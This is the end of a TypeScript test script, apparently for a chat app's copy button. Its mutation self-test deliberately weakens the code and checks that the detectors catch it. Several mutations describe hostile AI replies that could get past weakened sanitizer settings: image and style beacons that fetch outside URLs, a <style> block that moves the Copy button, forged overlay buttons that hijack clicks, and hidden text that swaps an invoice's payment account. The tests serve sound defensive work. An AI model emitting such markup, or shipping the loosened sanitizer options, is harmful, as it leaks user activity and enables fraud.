    assert(dead.length === 0,
      `under the options sanitizeReply replaced, all ${BEACONS.length} beacons fetch, the <style> moves the button and the bad attributes are kept${dead.length ? ` — NOT: ${dead.join(", ")}` : ""}`);

    console.log("\n2. Every detector, against the code as it is");
    const fired = await run(browser, origin, serve, css, NONE);
    for (let i = 0; i < DETECTORS.length; i++) {
      const d = DETECTORS[i];
      const why = fired[d.key];
      assert(!why, why ? `${d.says} — ${why.length}×, first: ${why[0]}` : d.says);
    }
    let unknown = "";
    for (const k in fired) if (Object.prototype.hasOwnProperty.call(fired, k) && !DETECTORS.some((d) => d.key === k)) unknown += ` ${k}`;
    assert(unknown === "", `no detector fired that this list does not name${unknown ? ":" + unknown : ""}`);

    if (!selfTest) {
      console.log(`\n${failures === 0 ? "✓ chat copy verified" : `✗ ${failures} failed`}\n`);
      return;
    }

    /* ─── Self-test ───────────────────────────────────────────────────────── */

    console.log("\n3. Self-test — each mutation must fire exactly the detectors it declares");
    const before = failures;
    /** One text edit to a real source file. An anchor that no longer matches
     *  is a loud failure: a chained mutation whose second edit silently did
     *  nothing once turned a one-line mutation into an infinite recursion. */
    const sub = (from: string, to: string) => (s: string) => {
      if (s.indexOf(from) < 0) throw new Error(`mutation anchor not found — re-anchor it: ${from.slice(0, 70)}`);
      return s.split(from).join(to);
    };

    interface Mut { name: string; mut: Mutation; kills: string[]; note: string; }
    const MUTATIONS: Mut[] = [
      {
        name: "no quote support (the shipped bug)",
        mut: { md: sub("function liftQuotes(text: string, sources: ParsedSource[], depth: number, store: string[]): string {\n",
          "function liftQuotes(text: string, sources: ParsedSource[], depth: number, store: string[]): string {\n  return text;\n") },
        kills: ["marker", "structure", "copy"],
        note: "the incident, reproduced",
      },
      {
        name: "a lazy continuation line is not part of the quote",
        mut: { md: sub("} else if (open && line.trim() !== \"\" && !BLOCK_START.test(line)) {", "} else if (false) {") },
        kills: ["structure", "copytext", "copyhtml", "paste", "spacing"],
        note: "CommonMark puts an unmarked line inside a quoted paragraph INTO the quote. Without that the draft splits in two and the first button copies half a sentence",
      },
      {
        name: "the quote pass reaches inside code",
        mut: { md: sub("const re = new RegExp(FENCE.source, \"g\");\n  let out = \"\";", "const re = /(?!)/g;\n  let out = \"\";") },
        kills: ["structure", "code", "codecopy", "style"],
        note: "a \">\" in a code block becomes a quote INSIDE the <pre>, so the code block's own Copy picks up the quote button's label",
      },
      {
        name: "a \">\" anywhere in a line opens a quote",
        mut: { md: (s) => sub("if (!/(^|\\n) {0,3}>/.test(text)) return text;\n  return outsideFences", "if (!/>/.test(text)) return text;\n  return outsideFences")(
          sub("const marker = depth < MAX_QUOTE_DEPTH ? /^ {0,3}> ?/ : /^(?: {0,3}> ?)+/;", "const marker = depth < MAX_QUOTE_DEPTH ? /^.*?> ?/ : /^(?:.*?> ?)+/;")(
            sub("const QUOTE_LINE = /^ {0,3}>/;", "const QUOTE_LINE = /^.*?>/;")(s))) },
        kills: ["structure", "notaquote", "live", "unseen", "vocab"],
        note: "\"Revenue > $5m\" becomes a quote of \"$5m\" — and every raw tag in the hostile replies opens a quote too, so the hidden spans, the overlay's quote and our own image never reach the page as written",
      },
      {
        name: "nested quotes flattened into the outer one",
        mut: { md: sub("const marker = depth < MAX_QUOTE_DEPTH ? /^ {0,3}> ?/ : /^(?: {0,3}> ?)+/;", "const marker = /^(?: {0,3}> ?)+/;") },
        kills: ["structure"],
        note: "copy does not notice — a nested quote is flattened on copy by design — so only the drawing does. Either treatment was acceptable; this pins the one chosen",
      },
      {
        name: "no floor on how deep quotes nest",
        mut: { md: sub("const marker = depth < MAX_QUOTE_DEPTH ? /^ {0,3}> ?/ : /^(?: {0,3}> ?)+/;", "const marker = /^ {0,3}> ?/;") },
        kills: ["depth"],
        note: "found by reading, then measured: about two thousand levels on one line threw \"Maximum call stack size exceeded\" from inside the render",
      },
      {
        name: "the button put INSIDE the blockquote",
        mut: { md: sub(
          "<div class=\"ai-quote-wrap\"><button type=\"button\" class=\"ai-quote-copy\" data-quote-copy aria-label=\"Copy the quoted text\">Copy</button><blockquote class=\"ai-quote\">${inner}</blockquote></div>",
          "<div class=\"ai-quote-wrap\"><blockquote class=\"ai-quote\"><button type=\"button\" class=\"ai-quote-copy\" data-quote-copy aria-label=\"Copy the quoted text\">Copy</button>${inner}</blockquote></div>"
        ) },
        kills: ["copy"],
        note: "SURVIVED until the handler learned to obey only the button formatMarkdown draws, where it draws it (2026-09-23). A button inside the quote is not that button, so it copies nothing — its place is load-bearing now",
      },
      {
        name: "the copy takes the block's innerHTML and textContent (the naive fix)",
        mut: { copy: sub("  const blocks = cleanBlocks(block);\n",
          "  return { html: block.innerHTML, plain: block.textContent || \"\" };\n  const blocks = cleanBlocks(block);\n") },
        kills: ["copytext", "copyhtml", "paste", "spacing", "ordinals", "unseen"],
        note: "textContent runs the paragraphs together at every block boundary, drops every list number and takes hidden text along, and innerHTML carries every ai- class into the paste",
      },
      {
        name: "the rich write refused, so only text is copied",
        mut: { copy: sub("  try {\n    await navigator.clipboard.write([", "  try {\n    throw new Error(\"refused\");\n    await navigator.clipboard.write([") },
        kills: ["fallback", "copyhtml", "paste"],
        note: "the fallback is honest — the button says \"Copied as text\" — and the paste detector records why it matters: plain text pasted into a rich field arrives with three newlines at every paragraph break",
      },
      {
        name: "paragraphs as bare <p>, the blank line left to the margin",
        mut: { copy: sub("return { html: html.join(\"<div><br></div>\"), plain: htmlToPlainText(blocks.join(\"\")) };",
          "return { html: blocks.join(\"\"), plain: htmlToPlainText(blocks.join(\"\")) };") },
        kills: ["spacing"],
        note: "the shape first built here, and the one a spec would write down. Every textual check passes — the words, the line breaks, even innerText's paragraph breaks — and the paste shows no blank line anywhere once paragraph margins are zeroed, which is what the proof screenshot of the real thread showed",
      },
      {
        name: "an empty <p> between bare <p>s",
        mut: { copy: (s) => sub("return { html: html.join(\"<div><br></div>\"),", "return { html: html.join(\"<p><br></p>\"),")(
          sub("html.push(b.indexOf(\"<p>\") === 0 ? `<div>${b.slice(3, -4)}</div>` : b);", "html.push(b);")(s)) },
        kills: ["spacing"],
        note: "the obvious repair of the one above, and wrong the other way: under the browser's own margins it shows a triple gap",
      },
      {
        name: "the citation chip copied with the link",
        mut: { copy: sub("    if (e.classList.contains(\"ai-cite\")) return \"\";\n", "") },
        kills: ["copytext", "paste"],
        note: "the chip is an anchor with a real href, so it copies as a second link and the text reads \"book a call1\". The first version of the walker had exactly this bug and this check's first run caught it: in the paragraph after a list, a loose link was judged by its children and the link itself was never seen",
      },
      {
        name: "a line break copied as a space",
        mut: { copy: sub("if (tag === \"BR\") return \"<br>\";", "if (tag === \"BR\") return \" \";") },
        kills: ["copytext", "copyhtml", "paste"],
        note: "\"Cheers,\\nChris\" becomes \"Cheers, Chris\"",
      },
      {
        name: "the code block's copy lost in the move to chat-copy.ts",
        mut: { copy: sub("if (drawn(btn, \"ai-code-copy\", \"data-code-copy\", \"ai-code-bar\")) {", "if (false) {") },
        kills: ["codecopy"],
        note: "the delegated handler moved out of MessageBubble into chat-copy.ts; this is the regression that move could have introduced",
      },
      {
        name: "\"data-quote-copy\" dropped from sanitizeReply's attributes",
        mut: { md: sub("\"data-code-copy\", \"data-quote-copy\",", "\"data-code-copy\",") },
        kills: ["copy", "overlap", "structure", "live"],
        note: "the button is still drawn and does nothing. overlap and structure fire as well because they find the button by the same attribute, and live because the overlay loses its hook with it. Under the options sanitizeReply replaced this SURVIVED: they let every data-* attribute through",
      },
      {
        name: "data-* attributes let through as a family again",
        mut: { md: sub("ALLOW_DATA_ATTR: false", "ALLOW_DATA_ATTR: true") },
        kills: ["vocab"],
        note: "a data attribute the model wrote reaches a page that acts on four of them",
      },
      {
        name: "sanitizeReply back to the options it replaced",
        mut: { md: (s) => sub("  purify.addHook(\"uponSanitizeElement\", untrustedImage);\n", "")(
          sub("return String(purify.sanitize(html, { ALLOWED_TAGS: REPLY_TAGS, ALLOWED_ATTR: REPLY_ATTRS, ALLOW_DATA_ATTR: false }));",
            "return String(purify.sanitize(html, " + OLD_OPTIONS + "));")(s)) },
        kills: ["beacon", "restyle", "vocab"],
        note: "DOMPurify's defaults keep every tag that merely loads: ten fetched an outside URL when painted, and the <style> set the Copy button to position: fixed",
      },
      {
        name: "the image hook removed",
        mut: { md: sub("  purify.addHook(\"uponSanitizeElement\", untrustedImage);\n", "") },
        kills: ["beacon", "vocab"],
        note: "a raw <img> fetches from anywhere — the markdown image allowlist, one tag to the side",
      },
      {
        name: "the image hook reading src only",
        mut: { md: sub("(retry === null || isAllowedImageUrl(retry))", "true") },
        kills: ["vocab"],
        note: "an allowlisted src with an outside retry URL, which MessageBubble loads on the first error. Nothing fetches at paint, so beacon cannot see it; the markup assertion does",
      },
      {
        name: "\"style\" back among the attributes",
        mut: { md: sub("\"src\", \"start\",", "\"src\", \"start\", \"style\",") },
        kills: ["beacon", "vocab"],
        note: "background-image: url() fetches",
      },
      {
        name: "<style> back among the tags",
        mut: { md: sub("\"strong\", \"sub\",", "\"strong\", \"style\", \"sub\",") },
        kills: ["beacon", "restyle", "vocab"],
        note: "a stylesheet in a reply restyles the whole page, the Copy button included",
      },
      {
        name: "the copy walker judging nothing hidden",
        mut: { copy: sub("function seen(e: Element): boolean {\n", "function seen(e: Element): boolean {\n  return true;\n") },
        kills: ["unseen"],
        note: "the verifier's invoice: the card reads \"Please pay the invoice at your convenience.\" and the paste names a new account",
      },
      {
        name: "the click handler back to any [data-quote-copy]",
        mut: { copy: sub("  const btn = el.closest(\"button\");\n",
          "  const loose = el.closest(\"[data-quote-copy]\");\n" +
          "  if (loose) { const b = loose.closest(\".ai-quote-wrap\")?.querySelector(\"blockquote\"); if (b) writeClip(draftClip(b)).then(() => flash(loose, \"Copied\")); return; }\n" +
          "  const btn = el.closest(\"button\");\n") },
        kills: ["hijack"],
        note: "the shipped handler: the overlay makes a click on empty page copy the quote under it while the real button reads \"Copy\", and the forged button copies its payload",
      },
      {
        name: "inPlace answering yes",
        mut: { copy: sub("function inPlace(btn: HTMLElement): boolean {\n", "function inPlace(btn: HTMLElement): boolean {\n  return true;\n") },
        kills: ["hijack"],
        note: "the forged button is formatMarkdown's markup to the byte; only where it sits gives it away",
      },
      {
        name: "drawn() without its exact-class test",
        mut: { copy: sub("return btn.className === cls && btn.hasAttribute(attr)", "return btn.classList.contains(cls) && btn.hasAttribute(attr)") },
        kills: [],
        note: "SURVIVES: every overlay the compiled stylesheet can build is out of flow or transparent, and inPlace refuses those first. The exact class stays as the cheaper refusal",
      },
      {
        name: "a rebuilt <ol> without its start or values",
        mut: { copy: sub("return t === \"ol\" && start !== 1 && start !== 0 ? `<ol start=\"${start}\">${items}</ol>` : `<${t}>${items}</${t}>`;",
          "return `<${t}>${items.replace(/ value=\"\\d+\"/g, \"\")}</${t}>`;") },
        kills: ["ordinals", "copytext"],
        note: "message bbca2d2b's six steps copied as 1, 2, 1, 2, 1, 2",
      },
      {
        name: "htmlToMarkdown numbering every list from 1",
        mut: { exp: sub("const marker = tag === \"ol\" ? `${ordinal}.` : \"-\";", "const marker = tag === \"ol\" ? `${n + 1}.` : \"-\";") },
        kills: ["ordinals", "copytext"],
        note: "the html half right and the plain half renumbered",
      },
      {
        name: "the draft styled as a quotation: italic and grey",
        mut: { css: (c) => c + "\n.ai-response .ai-quote { font-style: italic; color: hsl(var(--muted-foreground)); }" },
        kills: ["style"],
        note: "the usual quote treatment, and the wrong one for a letter the user is about to send as their own",
      },
      {
        name: "the button laid over the text",
        mut: { css: (c) => sub("display: flow-root;", "display: flow-root;\n  position: relative;")(
          sub("  float: right;\n  margin: -0.25rem -0.375rem 0.25rem 0.75rem;", "  position: absolute;\n  top: 0.5rem;\n  right: 0.5rem;")(c)) },
        kills: ["overlap", "copy", "restyle"],
        note: "an absolutely placed button sits on the first line. The incident's \"Hi Sam,\" is too short to reach it, which is why the two-version fixture opens with a long line. And it copies nothing: from the handler, a real button lifted out of the flow and an overlay look the same, so inPlace refuses both",
      },
      {
        name: "no frame",
        mut: { css: sub("  background: hsl(var(--card));\n  color: hsl(var(--card-foreground));\n  border: 1px solid hsl(var(--border));",
          "  color: hsl(var(--card-foreground));") },
        kills: ["frame"],
        note: "",
      },
      {
        name: "a card that only works in light mode",
        mut: { css: sub("  background: hsl(var(--card));\n  color: hsl(var(--card-foreground));", "  background: #ffffff;\n  color: hsl(var(--card-foreground));") },
        kills: ["contrast"],
        note: "a white card under light text in dark mode",
      },
      {
        name: "the message Copy keeps the markers",
        mut: { md: sub("return stripQuoteMarkers(withoutProposals)", "return withoutProposals") },
        kills: ["msgcopy"],
        note: "the second half of the incident: the message's own Copy",
      },
      {
        name: "the message Copy strips markers inside code as well",
        mut: { md: sub("    for (let i = 0; i < spans.length; i++) if (at >= spans[i][0] && at < spans[i][1]) return marker;\n", "") },
        kills: ["msgcopy"],
        note: "",
      },
      {
        name: "the scheduled email without quote support",
        mut: { email: sub("    if (/^ {0,3}>/.test(line)) {", "    if (false) {") },
        kills: ["email"],
        note: "a scheduled run is built from the same prompt, so the new rule would have put \"&gt;\" in front of every line of an emailed draft",
      },
      {
        name: "the prompt rule deleted",
        mut: { prompt: (t) => t.split(RULE[1]).join("") },
        kills: ["prompt"],
        note: "",
      },
      {
        name: "the prompt rule dropped where resourcing is on",
        mut: { prompt: (t, label) => (label.indexOf("resourcing=true") >= 0 ? t.split(RULE[0]).join("") : t) },
        kills: ["prompt"],
        note: "a rule that holds for some gate combinations is not a rule",
      },
      {
        name: "the prompt rule put back into Design Mode",
        mut: { prompt: (t, label) => (label.indexOf("design=true") >= 0
          ? t.split("DATA QUERIES (").join(`${RULE[0]}\n- ${RULE[1]} Each block gets a copy button.\n\nDATA QUERIES (`)
          : t) },
        kills: ["design"],
        note: "the verifier's finding: Design Mode's renderer has no quote blocks, so the rule makes every draft there the incident",
      },
      {
        name: "the prompt rule filed in the volatile tail",
        mut: { prompt: (t) => (t.indexOf(RULE[1]) >= 0 ? appendVolatile(t.split(RULE[1]).join(""), RULE[1]) : t) },
        kills: ["prompt"],
        note: "present, and re-sent uncached on every turn",
      },
      {
        name: "an old instruction planted: put drafts in a code block",
        mut: { prompt: (t) => t + "\nWhen you write an email draft, put the draft inside a code block so it is easy to copy." },
        kills: ["prompt"],
        note: "a new rule beside a contradicting old one changes nothing",
      },
    ];

    for (let i = 0; i < MUTATIONS.length; i++) {
      const mu = MUTATIONS[i];
      quiet = true;
      let got: Fired;
      try {
        got = await run(browser, origin, serve, css, mu.mut);
      } finally {
        quiet = false;
      }
      const firedKeys: string[] = [];
      for (const k in got) if (Object.prototype.hasOwnProperty.call(got, k)) firedKeys.push(k);
      const want = mu.kills.slice().sort().join(",");
      const have = firedKeys.sort().join(",");
      let firsts = "";
      for (let j = 0; j < firedKeys.length; j++) firsts += `\n        ${firedKeys[j]}: ${got[firedKeys[j]][0]}`;
      assert(want === have, `${mu.kills.length ? "KILLED  " : "SURVIVED"} ${mu.name} — fired [${have || "nothing"}]${firsts}${mu.note ? `\n      ${mu.note}` : ""}`);
    }
    assert(failures === before, "every mutation fired exactly what the log records");
    console.log(`\n${failures === 0 ? "✓ chat copy verified, and the check itself is honest" : `✗ ${failures} failed`}\n`);
  } finally {
    try { await browser.close(); } catch { /* already closed */ }
    server.close();
    if (scratch) rmSync(scratch, { recursive: true, force: true });
  }
}

main().then(
  () => process.exit(failures === 0 ? 0 : 1),
  (e) => {
    console.log("\n✗ cannot run:", e && e.message ? e.message : e, "\n");
    process.exit(1);
  }
);
